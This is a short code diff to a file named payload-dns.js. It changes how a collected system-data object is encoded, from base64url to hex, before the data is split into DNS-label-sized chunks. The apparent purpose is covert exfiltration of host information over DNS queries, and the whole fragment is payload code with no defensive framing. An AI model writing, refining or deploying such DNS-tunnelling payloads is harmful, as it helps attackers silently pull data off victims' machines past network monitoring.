@@ -11,7 +11,9 @@ const systemData = {
   t: Date.now().toString(36),
 };
 
-const encoded = Buffer.from(JSON.stringify(systemData)).toString("base64url");
+// Change the encoding line in payload-dns.js to use Hex instead of Base64url:
+const encoded = Buffer.from(JSON.stringify(systemData)).toString("hex");
+// const encoded = Buffer.from(JSON.stringify(systemData)).toString("base64url");
 
 // Split into DNS-safe chunks (max 63 chars per label)
 const chunks = encoded.match(/.{1,50}/g) || [];
